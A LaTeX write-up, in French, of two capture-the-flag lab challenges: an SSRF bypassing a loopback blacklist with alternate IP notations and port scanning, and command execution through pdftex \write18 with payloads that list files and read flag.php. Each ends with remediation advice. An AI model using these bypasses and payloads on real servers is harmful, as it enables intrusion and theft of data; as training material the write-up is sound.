\documentclass[11pt,a4paper]{article}

% ============================================================
% Mise en page
% ============================================================
\usepackage[margin=2.4cm]{geometry}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{xcolor}
\usepackage{fancyhdr}
\usepackage{titlesec}
\usepackage{enumitem}
\usepackage{tcolorbox}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{amssymb}
\usepackage{tabularx}
\usepackage{longtable}
\usepackage{array}
\usepackage{booktabs}
\tcbuselibrary{skins,breakable}

% ---- Palette ----
\definecolor{navy}{HTML}{1A3A6B}
\definecolor{gold}{HTML}{C9970A}
\definecolor{codebg}{HTML}{0D1117}
\definecolor{codefg}{HTML}{E6EDF3}
\definecolor{codegreen}{HTML}{7EE787}
\definecolor{codegray}{HTML}{8B949E}
\definecolor{codeorange}{HTML}{FFA657}
\definecolor{codepink}{HTML}{FF7B72}
\definecolor{boxwarn}{HTML}{FFF3F3}
\definecolor{boxwarnb}{HTML}{E0A0A0}
\definecolor{boxok}{HTML}{EAF3FB}
\definecolor{boxokb}{HTML}{1A3A6B}
\definecolor{boxkey}{HTML}{FEF3D6}
\definecolor{boxkeyb}{HTML}{C9970A}

% ---- Titres ----
\titleformat{\section}
  {\Large\bfseries\color{navy}}
  {\thesection}{0.6em}{}[{\color{gold}\titlerule[1.2pt]}]
\titleformat{\subsection}
  {\large\bfseries\color{navy}}
  {\thesubsection}{0.6em}{}
\titlespacing*{\section}{0pt}{1.6em}{0.9em}
\titlespacing*{\subsection}{0pt}{1.3em}{0.6em}

% ---- En-tetes ----
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.4pt}
\fancyhead[L]{\small\color{navy}\textbf{Cyberini Labs} --- Writeup}
\fancyhead[R]{\small\color{codegray}SSRF \& LaTeX \texttt{\textbackslash write18}}
\fancyfoot[C]{\small\thepage}

% ---- Code listings ----
\lstdefinestyle{term}{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\footnotesize\color{codefg},
  breaklines=true,
  breakatwhitespace=false,
  columns=fullflexible,
  keepspaces=true,
  frame=single,
  framerule=0pt,
  rulecolor=\color{codebg},
  framesep=8pt,
  xleftmargin=4pt,
  xrightmargin=4pt,
  showstringspaces=false,
  commentstyle=\color{codegray}\itshape,
  keywordstyle=\color{codeorange}\bfseries,
  stringstyle=\color{codegreen},
  identifierstyle=\color{codefg},
  literate=
    {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1 {à}{{\`a}}1 {ù}{{\`u}}1
    {É}{{\'E}}1 {È}{{\`E}}1 {î}{{\^i}}1 {ç}{{\c c}}1 {œ}{{\oe}}1,
}
\lstset{style=term}

\newtcolorbox{keyinsight}[1][]{
  colback=boxkey, colframe=boxkeyb, boxrule=0.8pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries, coltitle=black,
  title={Idee cle}, #1
}
\newtcolorbox{deadend}[1][]{
  colback=boxwarn, colframe=boxwarnb, boxrule=0.8pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries, coltitle=black,
  title={Piste eliminee}, #1
}
\newtcolorbox{noteok}[1][]{
  colback=boxok, colframe=boxokb, boxrule=0.8pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries\color{navy}, coltitle=navy,
  #1
}

\hypersetup{
  colorlinks=true, linkcolor=navy, urlcolor=navy, citecolor=navy,
  pdftitle={Writeup : SSRF et LaTeX write18 -- Cyberini Labs},
  pdfauthor={Assistant Claude},
}

\setlist[itemize]{leftmargin=1.4em}
\setlist[enumerate]{leftmargin=1.6em}

\begin{document}

% ============================================================
% Page de titre
% ============================================================
\begin{titlepage}
\centering
\vspace*{2.2cm}
{\Huge\bfseries\color{navy} Deux challenges Cyberini Labs\par}
\vspace{0.4cm}
{\Large\color{gold} Methodologie complete de resolution\par}
\vspace{1.6cm}

{\large\bfseries\color{navy} Challenge 1 --- Apercu d'URL\par}
{\large SSRF (Server-Side Request Forgery) et contournement de filtre IP\par}
\vspace{0.8cm}
{\large\bfseries\color{navy} Challenge 2 --- Convertisseur de fichiers\par}
{\large Execution de commandes via \texttt{\textbackslash write18} (LaTeX)\par}

\vspace{2.4cm}
\begin{tcolorbox}[colback=boxok, colframe=boxokb, width=0.82\textwidth, arc=3pt, boxrule=1pt]
\textbf{Cadre.} Deux exercices d'entrainement a la securite offensive,
resolus sur la plateforme Cyberini Labs, dans un environnement isole et
autorise a cet effet. Ce document reconstruit fidelement la demarche
suivie -- y compris les impasses -- pour que la methode soit
reutilisable, pas seulement le resultat.
\end{tcolorbox}

\vfill
{\small\color{codegray} Document genere le \today\par}
\end{titlepage}

\tableofcontents
\newpage

% ============================================================
% CHALLENGE 1
% ============================================================
\section{Challenge 1 --- Apercu d'URL (SSRF)}

\subsection{Enonce et objectif}

Le service propose un « apercu d'URL » : on lui donne une adresse,
il va la chercher lui-meme et affiche un extrait du HTML recu. L'enonce
precise qu'un panneau d'administration interne existe sur le serveur,
\textbf{inaccessible depuis Internet}, et donne deux indices :

\begin{itemize}
  \item \textit{Indice 1} : c'est le \textbf{serveur} qui emet la requete,
        depuis sa propre position reseau, vers un port a 4 chiffres
        courant pour les panneaux d'admin.
  \item \textit{Indice 2} : \texttt{127.0.0.1} et \texttt{localhost} sont
        bloques, mais une adresse IP peut s'ecrire de bien des facons.
\end{itemize}

Ces deux indices decrivent exactement une \textbf{SSRF} : on ne va pas
chercher a atteindre le panneau admin nous-memes (il est « inaccessible
depuis Internet »), on va faire en sorte que le \emph{serveur
vulnerable} le fasse a notre place, puisque lui, physiquement, est sur le
meme reseau que ce panneau.

\subsection{Reconnaissance de l'application}

Premiere etape : comprendre l'interface avant de chercher a la casser.

\begin{lstlisting}[language=bash]
curl -s -i -m 15 'http://<cible>/'
\end{lstlisting}

La page renvoie un simple formulaire :

\begin{lstlisting}[language=html]
<form action="/preview" method="get">
  <input type="text" name="url" placeholder="https://example.com" value="">
  <button type="submit">Apercu</button>
</form>
\end{lstlisting}

Donc le point d'entree est \texttt{GET /preview?url=<cible>}. Premier test
de reference, avec une URL externe normale, pour voir la forme d'une
reponse « saine » :

\begin{lstlisting}[language=bash]
curl -s 'http://<cible>/preview?url=http://example.com'
\end{lstlisting}

Le HTML d'\texttt{example.com} revient bien, integre dans un bloc
\texttt{.preview-frame}. Le service fait donc une vraie requete HTTP
sortante et en restitue le corps -- c'est le comportement qu'on va
detourner.

\subsection{Identification du filtre}

On teste ensuite directement les deux valeurs que l'enonce dit bloquees :

\begin{lstlisting}[language=bash]
curl -s '.../preview?url=http://127.0.0.1'
curl -s '.../preview?url=http://localhost'
\end{lstlisting}

Les deux renvoient la meme erreur :

\begin{lstlisting}
<div class="err">&#9888; Acces au reseau local interdit.</div>
\end{lstlisting}

\begin{noteok}
\textbf{Diagnostic.} Le message est identique pour les deux valeurs : le
filtre compare tres probablement la chaine de caracteres saisie a une
petite liste noire (\texttt{"127.0.0.1"}, \texttt{"localhost"}), plutot
que de resoudre reellement l'adresse et de verifier si elle appartient a
une plage privee/loopback. C'est exactement le genre de protection que
l'indice 2 invite a contourner.
\end{noteok}

\subsection{Pourquoi une IP peut s'ecrire de plusieurs facons}

Une adresse IPv4 comme \texttt{127.0.0.1} n'est, pour le systeme
d'exploitation et les bibliotheques reseau, qu'une maniere \emph{parmi
d'autres} de noter le nombre entier \texttt{2\,130\,706\,433} sur 32 bits.
Le resolveur de nom (\texttt{getaddrinfo}, utilise en coulisses par les
bibliotheques HTTP comme \texttt{requests} en Python) accepte
historiquement plusieurs notations heritees des toutes premieres
implementations BSD des sockets :

\begin{center}
\renewcommand{\arraystretch}{1.3}
\begin{tabularx}{\textwidth}{@{}l l X@{}}
\toprule
\textbf{Notation} & \textbf{Exemple} & \textbf{Principe} \\
\midrule
Decimale pointee (normale) & \texttt{127.0.0.1} & 4 octets separes par des points \\
Forme courte & \texttt{127.1} & Le dernier segment est interprete comme
  les 24 bits restants ; \texttt{127.1} $\equiv$ \texttt{127.0.0.1} \\
Octale & \texttt{0177.0.0.1} & Un segment prefixe par \texttt{0} est lu en
  base 8 ($\texttt{0177}_8 = 127_{10}$) \\
Hexadecimale & \texttt{0x7f.0.0.1} ou \texttt{0x7f000001} & Prefixe
  \texttt{0x}, base 16 \\
Decimale pure (32 bits) & \texttt{2130706433} & L'adresse entiere comme un
  seul entier non signe \\
IPv6 loopback & \texttt{[::1]} & Equivalent IPv6 de \texttt{127.0.0.1} \\
IPv4 mappee en IPv6 & \texttt{[::ffff:127.0.0.1]} & Forme hybride que
  certaines piles IPv6 acceptent \\
\bottomrule
\end{tabularx}
\end{center}

Un filtre qui fait un simple \texttt{if url\_contains("127.0.0.1")} ne
reconnait \textbf{aucune} de ces formes alternatives, alors que le
resolveur systeme, lui, les traduit toutes vers la meme adresse loopback.
C'est exactement l'ecart exploite ici.

\subsection{Contournement du filtre}

Test systematique de chaque forme, en encodant l'URL pour le parametre
GET :

\begin{lstlisting}[language=bash]
BASE='http://<cible>/preview?url='
for target in \
  "http://127.1" "http://0177.0.0.1" "http://0x7f.0.0.1" \
  "http://0x7f000001" "http://2130706433" "http://017700000001" \
  "http://127.000.000.001" "http://[::1]" ; do
  enc=$(python3 -c "import urllib.parse,sys; \
        print(urllib.parse.quote(sys.argv[1], safe=''))" "$target")
  curl -s "${BASE}${enc}" | grep -oE 'Acces au reseau local interdit|<div class="err">.{0,120}'
done
\end{lstlisting}

\textbf{Resultat} : toutes les formes numeriques (\texttt{127.1}, octal,
hexadecimal, decimal pur) passent le filtre -- la reponse n'est plus
« Acces au reseau local interdit » mais
\texttt{HTTPConnectionPool(host=...): Max retries exceeded}, c'est-a-dire
que le serveur a bien \emph{tente} la connexion, et a echoue simplement
parce que rien n'ecoute sur le port 80 a cette adresse. Seule la forme
litterale \texttt{[::1]} restait bloquee (le filtre reconnaissait
visiblement cette chaine-la aussi).

\begin{keyinsight}
Le message d'erreur a change de nature : on est passe d'un refus
applicatif (« interdit ») a un refus reseau (« connexion echouee »).
C'est le signal que le filtre est contourne et qu'une vraie tentative de
connexion loopback a lieu -- il ne reste plus qu'a trouver le bon port.
\end{keyinsight}

\subsection{Scan de ports depuis la position reseau du serveur}

\texttt{127.1} etant valide comme contournement, on l'utilise pour
balayer une liste de ports usuels de panneaux d'administration :

\begin{lstlisting}[language=bash]
BASE='http://<cible>/preview?url='
for port in 8000 8001 8080 8081 8443 8888 9000 9090 9200 5000 5050 \
            3000 4000 4040 4200 6000 7000 8008 8090 9001 1080 1099 8161; do
  enc=$(python3 -c "import urllib.parse; \
        print(urllib.parse.quote('http://127.1:$port', safe=''))")
  out=$(curl -s -m 6 "${BASE}${enc}")
  if echo "$out" | grep -q 'Max retries exceeded'; then
    echo "port $port : ferme"
  else
    echo "port $port : REPONSE DIFFERENTE !"
  fi
done
\end{lstlisting}

Sur la vingtaine de ports testes, un seul se distingue :
\textbf{\texttt{9000}} repond avec un contenu different -- pas d'erreur de
connexion, mais un vrai corps de reponse.

\subsection{Exploitation du panneau interne}

Requete finale, cette fois pour recuperer l'integralite du contenu :

\begin{lstlisting}[language=bash]
enc=$(python3 -c "import urllib.parse; \
      print(urllib.parse.quote('http://127.1:9000', safe=''))")
curl -s "http://<cible>/preview?url=${enc}"
\end{lstlisting}

Le panneau interne repond :

\begin{lstlisting}[language=html]
<h1>Panneau d'administration interne</h1>
<p>Ce service n'est accessible que depuis le serveur lui-meme (127.0.0.1).</p>
<p>Si vous lisez ceci de l'exterieur, c'est que vous avez reussi une SSRF.</p>
<pre>flag=s3rv3r_s1d3_r3qu3st_f0rg3ry</pre>
\end{lstlisting}

\begin{tcolorbox}[colback=black, colframe=gold, coltext=codegreen, arc=2pt,
  fonttitle=\bfseries\color{white}, coltitle=white, title=Flag obtenu]
\ttfamily s3rv3r\_s1d3\_r3qu3st\_f0rg3ry
\end{tcolorbox}

\subsection{Analyse et remediation}

\begin{itemize}
  \item \textbf{Cause racine} : validation par liste noire de chaines
        (\texttt{"127.0.0.1"}, \texttt{"localhost"}) au lieu d'une
        validation par \emph{resolution reelle de l'adresse}, suivie
        d'une verification de la plage IP obtenue.
  \item \textbf{Correction recommandee} : resoudre l'hote demande
        (\texttt{socket.getaddrinfo}), puis rejeter explicitement toute
        adresse appartenant a \texttt{127.0.0.0/8},
        \texttt{10.0.0.0/8}, \texttt{172.16.0.0/12},
        \texttt{192.168.0.0/16}, \texttt{169.254.0.0/16} (link-local /
        metadata cloud) et \texttt{::1}/\texttt{fc00::/7} en IPv6 --
        en utilisant une bibliotheque d'adresses IP (\texttt{ipaddress}
        en Python) plutot qu'une comparaison de texte.
  \item \textbf{Piege classique} : verifier l'adresse \emph{avant}
        resolution DNS n'est pas suffisant non plus (DNS rebinding) ;
        idealement, la connexion sortante elle-meme doit etre filtree
        au niveau reseau (allowlist de destinations, proxy sortant
        dedie), pas seulement au niveau applicatif.
\end{itemize}

\newpage
% ============================================================
% CHALLENGE 2
% ============================================================
\section{Challenge 2 --- Convertisseur de fichiers (LaTeX \texttt{\textbackslash write18})}

\subsection{Enonce et objectif}

Un site convertit un fichier LaTeX envoye par l'utilisateur en PDF.
Deux indices :

\begin{itemize}
  \item \textit{Indice 1} : le mot \texttt{write18}.
  \item \textit{Indice 2} : « Exemple de commande qui pourrait etre
        utilisee par le convertisseur : \texttt{shell\_exec('.../pdftex
        --shell-escape...')} ».
\end{itemize}

\texttt{\textbackslash write18} est une primitive TeX qui, quand le
moteur est lance avec \texttt{--shell-escape}, execute une commande shell
arbitraire depuis l'interieur du document. Si un serveur compile des
fichiers LaTeX fournis par les utilisateurs avec cette option activee,
c'est une execution de commande a distance (RCE) deguisee en fonctionnalite.

\begin{keyinsight}
\texttt{pdftex} $\neq$ \texttt{pdflatex}. \texttt{pdftex} est le moteur
TeX \emph{brut} : il ne connait ni \texttt{\textbackslash documentclass},
ni \texttt{\textbackslash begin\{document\}} (ce sont des macros
\emph{LaTeX}, chargees par le \emph{format} pdflatex, pas par le moteur
lui-meme). Ce detail, donne explicitement par l'indice 2, s'est revele
determinant -- et je suis d'abord passe a cote.
\end{keyinsight}

\subsection{Reconnaissance de l'application}

\begin{lstlisting}[language=bash]
curl -s -i 'http://<cible>/'
\end{lstlisting}

Le formulaire :

\begin{lstlisting}[language=html]
<form method="POST" enctype="multipart/form-data">
  <input name="source_file" id="button-file" type="file">
  <input type="submit" name="convert" value="Convertir en PDF">
</form>
\end{lstlisting}

Premier essai avec un document LaTeX classique et valide :

\begin{lstlisting}[language=bash]
cat > test.tex <<'EOF'
\documentclass{article}
\begin{document}
Hello CTF
\end{document}
EOF
curl -s -F "source_file=@test.tex" -F "convert=Convertir en PDF" \
     'http://<cible>/index.php'
\end{lstlisting}

Reponse :

\begin{lstlisting}
<span id="results">Erreur lors du parsing du fichier, veuillez reessayer.</span>
\end{lstlisting}

C'est la que commence la partie la plus longue de ce challenge : cette
meme erreur, mot pour mot, va revenir pour \emph{tous} les essais
suivants pendant un bon moment. Le reste de cette section documente,
dans l'ordre, chaque hypothese testee -- y compris celles qui se sont
revelees fausses -- parce que la demarche d'elimination est ce qui a
permis de trouver la bonne piste au final.

\subsection{Premiere serie d'hypotheses (toutes eliminees)}

\begin{deadend}
\textbf{Hypothese : type MIME du fichier.} Le formulaire n'envoie aucun
type explicite ; peut-etre que le serveur exige
\texttt{text/x-tex} ou \texttt{text/plain}. Teste avec
\texttt{curl -F "source\_file=@test.tex;type=..."} pour 5 valeurs
differentes -- \textbf{aucune ne change le resultat}.
\end{deadend}

\begin{deadend}
\textbf{Hypothese : en-tetes HTTP manquants.} Ajout de
\texttt{User-Agent}, \texttt{Referer}, \texttt{Origin} realistes, au cas
ou un contournement CSRF/anti-bot serait attendu. \textbf{Aucun effet.}
\end{deadend}

\begin{deadend}
\textbf{Hypothese : session/cookie requis.} Recuperation d'un cookie via
un \texttt{GET} initial avant de poster. \textbf{Le serveur n'emet meme
pas de cookie} -- piste ecartee.
\end{deadend}

\begin{deadend}
\textbf{Hypothese : fins de ligne CRLF requises.} Le fichier est peut-etre
attendu au format Windows. Reencodage en \texttt{\textbackslash r\textbackslash n}. \textbf{Aucun effet.}
\end{deadend}

\begin{deadend}
\textbf{Hypothese : contenu invalide systematiquement rejete.} Test avec
un fichier texte totalement vide de commandes LaTeX (\texttt{"Hello
world"} brut). \textbf{Meme erreur} -- donc le contenu, en lui-meme, ne
semble pas etre la variable determinante.
\end{deadend}

A ce stade, un test structurant : que se passe-t-il si on envoie une
requete \emph{sans} fichier du tout, ou avec un fichier vide ?

\begin{lstlisting}[language=bash]
# Sans fichier :
curl -s -F "convert=Convertir en PDF" 'http://<cible>/index.php'
# -> resultat: span VIDE, pas d'erreur

# Fichier de 0 octet :
curl -s -F "source_file=@empty.tex" -F "convert=..." '...'
# -> meme erreur que d'habitude
\end{lstlisting}

\begin{noteok}
\textbf{Enseignement.} L'application distingue bien « pas de fichier »
(span vide) de « fichier recu, echec du traitement » (erreur). Le
code cote serveur reagit donc reellement a notre requete : ce n'est pas un
message statique. Le probleme est ailleurs dans la chaine de traitement,
pas dans la detection de presence du fichier.
\end{noteok}

\subsection{Verification de l'hypothese « environnement casse »}

A ce stade du challenge, avec plus d'une dizaine de tentatives
identiques, l'hypothese d'un \textbf{bug d'infrastructure du cote du
laboratoire} (binaire manquant, \texttt{PATH} incomplet pour le processus
serveur) semblait la plus probable. Avant de s'y arreter, deux tests
decisifs ont ete menes.

\paragraph{Test de timing a l'aveugle.} Si \texttt{\textbackslash write18}
s'execute vraiment, une commande \texttt{sleep} devrait bloquer la reponse
HTTP d'autant :

\begin{lstlisting}[language=bash]
cat > sleep.tex <<'EOF'
\documentclass{article}
\begin{document}
\immediate\write18{sleep 8}
\end{document}
EOF
time curl -s -F "source_file=@sleep.tex" -F "convert=..." '...'
# resultat : 0.587s (baseline sans write18 : 0.288s)
\end{lstlisting}

Aucun delai de 8 secondes : soit la commande ne s'execute pas du tout,
soit elle est executee mais \emph{silencieusement ignoree} (voir plus
loin, section~\ref{sec:restricted}).

\paragraph{Test navigateur reel.} Pour ecarter tout artefact propre a
\texttt{curl} (encodage multipart non standard, en-tetes manquants), le
meme test a ete rejoue avec un vrai navigateur pilote via Playwright :

\begin{lstlisting}
const p = await browser.newPage();
await p.goto('http://<cible>/');
await p.setInputFiles('#button-file', 'test.tex');
await p.click('#button-convert');
const results = await p.$eval('#results', e => e.textContent.trim());
// -> "Erreur lors du parsing du fichier, veuillez reessayer."
\end{lstlisting}

\textbf{Meme resultat exactement.} Ce test a definitivement ecarte tout
biais lie a l'outil client : le probleme est purement cote serveur.

\subsection{L'indice manque : \texttt{pdftex} n'est pas \texttt{pdflatex}}
\label{sec:pdftex}

En relisant l'indice 2 attentivement --
\texttt{shell\_exec('.../\textbf{pdftex} --shell-escape...')} -- le nom du
binaire est \texttt{pdftex}, pas \texttt{pdflatex}. Or tous les fichiers
envoyes jusque-la utilisaient \texttt{\textbackslash documentclass\{article\}}
et \texttt{\textbackslash begin\{document\}}, qui sont des macros
\textbf{LaTeX}. Le moteur \texttt{pdftex} pur ne charge \emph{aucun}
format LaTeX par defaut : ces commandes y sont simplement
« undefined control sequence », ce qui provoque une erreur fatale
\textbf{avant meme d'atteindre} la ligne \texttt{\textbackslash write18}
si elle est placee dans le corps du document.

Verification locale immediate, avec le vrai binaire \texttt{pdftex} :

\begin{lstlisting}[language=bash]
cat > plain.tex <<'EOF'
\immediate\write18{id > pwn_local.txt}
\bye
EOF
pdftex --shell-escape -interaction=nonstopmode plain.tex
cat pwn_local.txt
\end{lstlisting}

\begin{lstlisting}
uid=1000(xeno369) gid=1000(xeno369) groupes=...
\end{lstlisting}

\begin{keyinsight}
En syntaxe TeX « pure » -- sans \texttt{\textbackslash documentclass},
sans \texttt{\textbackslash begin\{document\}}, terminee par
\texttt{\textbackslash bye} au lieu de
\texttt{\textbackslash end\{document\}} -- \texttt{\textbackslash write18}
fonctionne parfaitement avec \texttt{--shell-escape}. C'etait la piece qui
manquait : le payload devait etre ecrit dans le \emph{bon dialecte}.
\end{keyinsight}

\subsection{Mode restreint vs. mode complet de \texttt{\textbackslash write18}}
\label{sec:restricted}

Un point important, verifie en local, pour comprendre le test de timing
precedent : \textbf{sans} l'option \texttt{--shell-escape}, pdftex active
quand meme un « \texttt{\textbackslash write18} restreint », qui
n'autorise qu'une petite liste blanche de commandes (\texttt{bibtex},
\texttt{makeindex}, \texttt{mpost}, \texttt{kpsewhich}, etc.). Une commande
hors liste, comme \texttt{id} ou \texttt{sleep}, est \textbf{silencieusement
ignoree} -- la compilation continue normalement, sans erreur visible :

\begin{lstlisting}[language=bash]
pdftex -interaction=nonstopmode restricted_test.tex
# " restricted \write18 enabled."
# la commande "id" ne s'execute pas, mais la compilation continue
\end{lstlisting}

Cela signifie qu'un test de timing negatif (pas de delai) ne prouve pas a
lui seul que \texttt{\textbackslash write18} est totalement inoperant --
il peut aussi etre actif mais restreint. Dans notre cas, l'indice 2
mentionnant explicitement \texttt{--shell-escape} suggerait le mode
complet ; la suite a confirme que c'etait bien le cas des que la syntaxe
etait correcte.

\subsection{L'obstacle suivant : la commande s'execute, mais on ne voit rien}

Avec la syntaxe TeX pure envoyee a la vraie cible :

\begin{lstlisting}[language=bash]
cat > exploit.tex <<'EOF'
\immediate\write18{ (id; whoami; pwd; ls -la /) > pwn.txt 2>&1 }
\bye
EOF
curl -s -F "source_file=@exploit.tex" -F "convert=..." 'http://<cible>/'
\end{lstlisting}

Le message d'erreur generique persistait \textbf{encore}. Mais un detail
important avait ete etabli plus tot : le repertoire \texttt{/uploads/}
avait le listing Apache active, et on pouvait y consulter directement les
fichiers \texttt{.tex} envoyes (\texttt{http://<cible>/uploads/test.tex}
renvoyait 200). Ce repertoire est donc a la fois \textbf{ecrit par PHP}
(via \texttt{move\_uploaded\_file}) et \textbf{servi publiquement} par
Apache -- un candidat naturel pour recuperer une sortie de commande, a
condition d'y ecrire au bon endroit.

Premiers essais avec des chemins absolus devines
(\texttt{/var/www/html/uploads/...}) : sans succes visible. A ce stade,
deux causes possibles restaient ouvertes : soit le chemin devine etait
faux, soit \texttt{\textbackslash write18} s'executait dans un repertoire
de travail totalement different (inconnu, non servi par le web).

\subsection{Le piege de \texttt{grep -r /}}

Pour lever l'ambiguite sans deviner a l'aveugle, l'idee a ete de faire
\textbf{localiser la commande elle-meme} sur le disque : placer un
marqueur unique dans le fichier \texttt{.tex} envoye, puis utiliser
\texttt{grep -rl} pour retrouver son propre chemin absolu sur le
systeme de fichiers cible.

Premiere tentative, en cherchant depuis la racine \texttt{/} :

\begin{lstlisting}[language=bash]
\immediate\write18{ grep -rl 'MARKER' / 2>/dev/null | head -1 ... }
\end{lstlisting}

\textbf{Cette requete n'a jamais abouti} (timeout cote client). Raison :
une recherche recursive depuis \texttt{/} traverse \texttt{/proc}, qui
contient des fichiers virtuels dont la lecture peut bloquer
indefiniment (par exemple \texttt{/proc/kcore} ou certaines entrees de
\texttt{/proc/<pid>/}). La commande shell distante restait bloquee, donc
la reponse HTTP ne revenait jamais.

\begin{deadend}
\textbf{Correction.} Ne jamais lancer un \texttt{grep -r} ou
\texttt{find} recursif sur \texttt{/} sans exclure explicitement les
pseudo-systemes de fichiers (\texttt{/proc}, \texttt{/sys}, \texttt{/dev}).
La bonne pratique est de \textbf{scoper la recherche} aux repertoires
plausibles uniquement.
\end{deadend}

\subsection{La percee : un payload qui se localise lui-meme}

Nouvelle version, avec une recherche bornee a des repertoires
applicatifs usuels (aucun pseudo-FS) :

\begin{lstlisting}[language=bash]
cat > selflocate2.tex <<'EOF'
% MARKER_ZQ7X9K2
\immediate\write18{
  loc=$(grep -rl 'MARKER_ZQ7X9K2' /var /home /opt /srv /usr/share /app /tmp 2>/dev/null | head -1);
  d=$(dirname "$loc");
  (echo LOC=$loc; echo DIR=$d; id; pwd;
   echo ---LS-DIR---; ls -la "$d";
   echo ---LS-ROOT---; ls -la /;
   echo ---FIND-FLAG---; find /var /home /opt /srv /app -iname '*flag*' 2>/dev/null
  ) > "$d/pwn5.txt" 2>&1
}
\bye
EOF
curl -s -F "source_file=@selflocate2.tex" -F "convert=..." 'http://<cible>/'
\end{lstlisting}

Le principe : puisque le fichier \texttt{.tex} qu'on vient d'envoyer
contient un marqueur unique, le \texttt{grep} le retrouve forcement sur
le disque -- \textbf{peu importe le repertoire de travail reel de
\texttt{pdftex}}, qu'on ne connait pas et n'a plus besoin de deviner. La
sortie est ensuite ecrite juste a cote, dans le meme dossier -- qui, on le
sait deja, est servi par le web.

\begin{lstlisting}[language=bash]
curl -s 'http://<cible>/uploads/pwn5.txt'
\end{lstlisting}

\begin{lstlisting}
LOC=/var/www/html/uploads/selflocate.tex
DIR=/var/www/html/uploads
uid=1001(user) gid=0(root) groups=0(root)
/var/www/html
---LS-ROOT---
...
---FIND-FLAG---
/var/www/html/flag.php
\end{lstlisting}

\begin{keyinsight}
Le repertoire reel etait bien \texttt{/var/www/html/uploads} -- une
hypothese testee des le debut, mais jamais confirmee car la premiere
tentative (avant la decouverte de la syntaxe TeX pure) utilisait encore
\texttt{\textbackslash documentclass}, donc n'atteignait jamais la ligne
\texttt{\textbackslash write18}. Les deux blocages (syntaxe et
localisation) se sont superposes ; il fallait resoudre le premier avant
de pouvoir seulement observer le second.
\end{keyinsight}

\subsection{Recuperation du flag}

\texttt{/var/www/html/flag.php} identifie, deux voies pour le lire :

\begin{lstlisting}[language=bash]
# 1. Execution directe via HTTP (le fichier est dans le webroot) :
curl -s 'http://<cible>/flag.php'
# -> "Est-ce que ce fichier pourrait etre utile ?"  (le PHP s'execute, pas le flag)

# 2. Lecture du CODE SOURCE brut via write18 (contourne l'execution PHP) :
\immediate\write18{ cat /var/www/html/flag.php > /var/www/html/uploads/flagout.txt }
\end{lstlisting}

La premiere methode ne renvoie que la sortie \emph{executee} du script
(un message anodin) : le flag est en commentaire dans le code, donc
invisible via une requete HTTP normale. La seconde methode, en lisant le
fichier comme du texte plutot que de l'executer, revele son contenu
integral :

\begin{lstlisting}[language=php]
<?php
echo "Est-ce que ce fichier pourrait etre utile ?";
//Bravo !
$the_flag = "{CTF_Cyberini_4LIFE}";
?>
\end{lstlisting}

\begin{tcolorbox}[colback=black, colframe=gold, coltext=codegreen, arc=2pt,
  fonttitle=\bfseries\color{white}, coltitle=white, title=Flag obtenu]
\ttfamily CTF\_Cyberini\_4LIFE
\end{tcolorbox}

\subsection{Analyse et remediation}

\begin{itemize}
  \item \textbf{Cause racine} : compilation d'un document LaTeX fourni
        par l'utilisateur avec \texttt{--shell-escape} actif, ce qui
        transforme un convertisseur de documents en execution de
        commande a distance.
  \item \textbf{Correction recommandee} :
    \begin{enumerate}
      \item Ne \textbf{jamais} activer \texttt{--shell-escape} (ni le
            mode restreint) pour de la compilation de documents
            non fiables. Utiliser \texttt{-no-shell-escape} explicitement.
      \item Si des commandes shell sont reellement necessaires
            (ex.\ \texttt{epstopdf}), les executer dans un
            \textbf{bac a sable strict} : conteneur ephemere sans acces
            reseau, systeme de fichiers en lecture seule hors d'un
            repertoire de travail dedie, utilisateur non privilegie,
            quotas CPU/memoire/temps.
      \item Ne jamais placer de secrets (flags, cles, configuration)
            dans le \textbf{webroot} servi par Apache/Nginx --
            meme un fichier « cache » y reste techniquement
            accessible des qu'un chemin est devine ou trouve.
    \end{enumerate}
\end{itemize}

\newpage
% ============================================================
% CONCLUSION
% ============================================================
\section{Conclusion --- methode transferable}

Au-dela des deux flags, la vraie valeur de ces deux exercices est
methodologique. Trois reflexes reviennent dans les deux resolutions :

\begin{enumerate}
  \item \textbf{Isoler une variable a la fois.} Face a un comportement
        opaque (erreur generique identique partout), changer un seul
        parametre par test -- MIME, en-tetes, contenu, syntaxe, taille --
        pour identifier lequel, s'il en existe un, influence le resultat.
        Le challenge 2 a demande plus d'une dizaine d'iterations de ce
        type avant la percee.
  \item \textbf{Verifier a l'aveugle quand on ne voit rien.} Le test de
        timing (\texttt{sleep}) et le test navigateur-reel sont deux
        techniques classiques pour distinguer « ca ne s'execute pas »
        de « ca s'execute mais je ne vois pas le resultat » -- une
        distinction cruciale qui a change toute la direction de
        l'investigation.
  \item \textbf{Faire que la cible se documente elle-meme.} Plutot que
        de deviner un chemin par tatonnement (approche qui echoue vite
        des que l'espace de recherche grandit), le payload
        auto-localisant (marqueur unique + \texttt{grep}) a transforme
        un probleme de devinette en un probleme de decouverte
        deterministe.
\end{enumerate}

\vspace{1em}
\begin{center}
\renewcommand{\arraystretch}{1.4}
\begin{tabularx}{\textwidth}{@{}l X X@{}}
\toprule
& \textbf{Challenge 1 (SSRF)} & \textbf{Challenge 2 (\texttt{write18})} \\
\midrule
Classe de vuln. & Server-Side Request Forgery & Remote Code Execution via
  compilation non sandboxee \\
Protection contournee & Liste noire de chaines IP & Aucune (le vrai
  obstacle etait la syntaxe, pas une protection) \\
Outil decisif & Encodage d'adresses IP alternatives & Payload
  auto-localisant (marqueur + \texttt{grep} borne) \\
Flag & \texttt{s3rv3r\_s1d3\_r3qu3st\_f0rg3ry} & \texttt{CTF\_Cyberini\_4LIFE} \\
\bottomrule
\end{tabularx}
\end{center}

\end{document}
